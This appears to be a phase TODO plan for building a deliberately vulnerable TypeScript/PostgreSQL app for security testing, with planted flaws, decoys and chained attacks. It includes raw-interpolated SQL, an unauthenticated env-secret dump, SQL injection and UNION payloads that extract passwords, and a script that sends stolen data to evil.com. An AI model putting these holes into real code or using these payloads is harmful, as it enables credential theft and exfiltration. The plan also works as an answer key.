# Phase 02 TODO — PostgreSQL Migration + Dashboard Search

## Pre-requisites
- [ ] Phase 01 complete and verified
- [ ] Read `vuln-inventory.md` — confirm no-touch files
- [ ] Docker Compose running with healthy PostgreSQL

## Schema Migration
- [ ] Create `src/config/schema.sql`:
  - `CREATE TABLE IF NOT EXISTS users (id SERIAL PRIMARY KEY, username VARCHAR(255) UNIQUE, password VARCHAR(255), display_name VARCHAR(255))`
  - `CREATE TABLE IF NOT EXISTS widgets (id SERIAL PRIMARY KEY, user_id INTEGER REFERENCES users(id), title VARCHAR(255), type VARCHAR(50), config JSONB DEFAULT '{}', value VARCHAR(255))`
  - `CREATE TABLE IF NOT EXISTS dashboards (id SERIAL PRIMARY KEY, user_id INTEGER REFERENCES users(id), name VARCHAR(255), layout JSONB, created_at TIMESTAMP DEFAULT NOW())`
  - `CREATE TABLE IF NOT EXISTS analytics_events (id BIGSERIAL, widget_id INTEGER, event_type VARCHAR(50), payload JSONB, created_at TIMESTAMP DEFAULT NOW()) PARTITION BY RANGE (created_at)`
  - `CREATE TABLE analytics_events_2026_01 PARTITION OF analytics_events FOR VALUES FROM ('2026-01-01') TO ('2026-02-01')`
  - Continue partitions through current month
  - `CREATE TABLE IF NOT EXISTS share_tokens (id SERIAL PRIMARY KEY, dashboard_id INTEGER REFERENCES dashboards(id), token VARCHAR(255), created_by INTEGER REFERENCES users(id), created_at TIMESTAMP DEFAULT NOW())`

## Seed Data
- [ ] Create `src/config/seed.sql`:
  - Insert 3 users (alice/alice123, bob/bob123, carol/carol123)
  - Insert 6 widgets across users (Follower Growth, Engagement Rate, Campaign Reach, etc.)
  - Insert 6 dashboards (Alice: "Q1 Campaign Report", "Influencer Tracker"; Bob: "Brand Lift Study", "Weekly Snapshot"; Carol: "Competitor Analysis", "Content Calendar")
  - Insert 20 analytics_events with varied timestamps, event_types (like, comment, share, impression), and JSON payloads

## Migration Runner
- [ ] Edit `src/config/db.ts` (extend from Phase 1):
  - Add `runMigrations()`: read `schema.sql`, split on `;`, execute each statement via pool
  - Add `runMigrations()`: read `seed.sql`, execute via pool
  - Call both functions after `waitForDb()` resolves

## Repository Layer — Migrate Existing
- [ ] Edit `src/repositories/UserRepository.ts`:
  - Remove `InMemoryDatabase` dependency
  - Add pool dependency (inject via constructor)
  - `findByUsername(username)`: `pool.query('SELECT * FROM users WHERE username = $1', [username])` — **parameterized, decoy**
  - `findById(id)`: `pool.query('SELECT * FROM users WHERE id = $1', [id])` — **parameterized, decoy**
  - Preserve existing annotation-free code patterns
- [ ] Edit `src/repositories/WidgetRepository.ts`:
  - Remove `InMemoryDatabase` dependency
  - Add pool dependency
  - `findByUserId(userId)`: `pool.query('SELECT * FROM widgets WHERE user_id = $1', [userId])` — **parameterized, decoy**
  - `createWidget(userId, title, type, value)`: `pool.query('INSERT INTO widgets (user_id, title, type, value) VALUES ($1, $2, $3, $4) RETURNING *', [...])` — **parameterized, decoy**
  - `deleteWidget(id, userId)`: `pool.query('DELETE FROM widgets WHERE id = $1 AND user_id = $2', [id, userId])` — **parameterized, decoy**

## Repository Layer — New
- [ ] Create `src/repositories/DashboardRepository.ts`:
  <!-- INTENTIONALLY VULNERABLE -->
  - `search(userId, query)`:
    ```typescript
    // VULNERABILITY A03: Dashboard search uses raw string interpolation in SQL query.
    const result = await pool.query(`SELECT * FROM dashboards WHERE user_id = ${userId} AND name ILIKE '%${query}%'`);
    return result.rows;
    ```
  - `findByUserId(userId)`: `pool.query('SELECT * FROM dashboards WHERE user_id = $1', [userId])` — **parameterized, decoy** (same file, adjacent method)
  - `findById(id)`: parameterized
  - `create(userId, name, layout)`: parameterized
- [ ] Create `src/repositories/AnalyticsRepository.ts`:
  - `insertEvent(widgetId, eventType, payload)`: `pool.query('INSERT INTO analytics_events (widget_id, event_type, payload) VALUES ($1, $2, $3) RETURNING *', [...])` — **parameterized, decoy**
  - `getEventsByWidget(widgetId)`: parameterized
  - `getRecentEvents(limit)`: parameterized

## Service Layer — New
- [ ] Create `src/services/ConfigService.ts`:
  - `getEnv()`: returns `{ ...process.env }` — intentionally dumps all env vars
  <!-- Annotation: // VULNERABILITY A05: Exposes raw process.env including database credentials and service tokens. -->
- [ ] Create `src/services/WidgetService.ts` (update existing if needed):
  - `createWidget(userId, title, type, value, config)`: passes config through to repository without validation
  <!-- Annotation: // CHAIN LINK 1 (chain-02): Widget config accepted without whitelist, allowing malicious payload injection. -->

## Controller Layer — New
- [ ] Create `src/controllers/ConfigController.ts`:
  - `getEnv(_req, res)`: `res.json(configService.getEnv())`
  - Annotation: `// VULNERABILITY A05: Unauthenticated environment dump returns raw process.env with credentials.`
- [ ] Create `src/controllers/DashboardController.ts`:
  - Constructor takes `DashboardRepository` + `AuthService`
  - `search(req, res)`: extract `q` from query, extract userId from session via AuthService, call `dashboardRepository.search(userId, q)`
  - `list(req, res)`: get userId from session, call `dashboardRepository.findByUserId(userId)` — **parameterized, decoy**
  - `create(req, res)`: extract name/layout from body, call `dashboardRepository.create(userId, name, layout)`
- [ ] Edit `src/controllers/WidgetController.ts`:
  - `createWidget` now passes `req.body.config` to WidgetService.createWidget (chain-02 step 1)

## Routes — New
- [ ] Create `src/routes/configRoutes.ts`:
  - `GET /api/config/env` -> `ConfigController.getEnv()`
- [ ] Create `src/routes/dashboardRoutes.ts`:
  - `GET /api/dashboards` -> `DashboardController.list()`
  - `POST /api/dashboards` -> `DashboardController.create()`
  - `GET /api/dashboards/search` -> `DashboardController.search()`

## App Wiring
- [ ] Edit `src/app.ts`:
  - Import new repositories, services, controllers, routes
  - Wire into DI graph
  - `app.use("/api/config", createConfigRoutes(new ConfigController(configService)))`
  - `app.use("/api/dashboards", createDashboardRoutes(new DashboardController(dashboardRepository, authService)))`

## Verification
- [ ] Run `docker compose up --build -d`
- [ ] Wait for all healthchecks healthy
- [ ] Verify schema: connect to PG, confirm all 5 tables exist with partitions
- [ ] Verify seed: `SELECT COUNT(*) FROM users` -> 3; `FROM dashboards` -> 6; `FROM analytics_events` -> 20
- [ ] Verify existing endpoints still work:
  - `POST /api/auth/login` with `{ username: "alice", password: "alice123" }` -> 200
  - `GET /api/widgets` -> 200, returns widgets from PG
  - `POST /api/widgets` with `{ title: "Test", type: "metric", value: "42%" }` -> 200
  - `POST /api/preview` -> 200 (SSRF still functional)
  - `GET /api/debug/config` -> 200 (A05 still leaks appConfig)
- [ ] Verify A03 SQLi:
  - `GET /api/dashboards/search?q=' OR 1=1--` -> returns all dashboards (unfiltered)
  - `GET /api/dashboards/search?q=Q1' UNION SELECT id,username,password,display_name,'[]'::json, now() FROM users--` -> exposes user credentials
- [ ] Verify A05 env leak:
  - `GET /api/config/env` -> returns `POSTGRES_PASSWORD`, `REDIS_URL`, `KAFKA_BROKERS`, `SESSION_SECRET`
- [ ] Verify chain-02 step 1:
  - `POST /api/widgets` with `{ "title": "X", "type": "metric", "value": "1", "config": { "renderScript": "fetch('/api/config/env').then(r=>r.json()).then(d=>new Image().src='http://evil.com?d='+btoa(JSON.stringify(d)))" } }` -> 200, config accepted
- [ ] Verify decoys:
  - DECOY-03: `UserRepository.findByUsername` parameterized — SQLi attempt on login fails safely
  - DECOY-04: `DashboardRepository.findByUserId` parameterized — valid user returns only their dashboards
  - DECOY-05: `AnalyticsRepository.insertEvent` parameterized — event insert works safely

## Metadata Sync
- [ ] Update `apps/typescript/app-11-social-analytics/.vulns`:
  - Add VULN-06 (A03 SQLi) to `vulnerabilities` array
  - Add VULN-07 (A05 env leak) to `vulnerabilities` array
  - Add chain-02 with step 1 to `chained_attacks` array
  - Add new decoys to `decoys` array
- [ ] Update `apps/typescript/app-11-social-analytics/README.md`:
  - Add new endpoints to API table
  - Add chain-02 to Chained Vulnerability Scenario section (as not-yet-complete note)
- [ ] Update `apps/typescript/app-11-social-analytics/scenarios.md`:
  - Add chain-02 attack narrative placeholder

## Regular Commits
- [ ] Commit after each major task:
  `git add -A && git commit -m "app-11 phase-02: <descriptive message>"`
- [ ] Push to remote after each commit

## Phase Status Report
- [ ] Create `phase-02/status-report.md` after completion:
  - Files created (count)
  - Files modified (count)
  - Vulnerabilities planted (type, location)
  - Decoys planted (location)
  - Existing vulns still intact? (yes/no)
  - Chains functional? (yes/no)
  - Tests passing? (yes/no)
  - Blockers
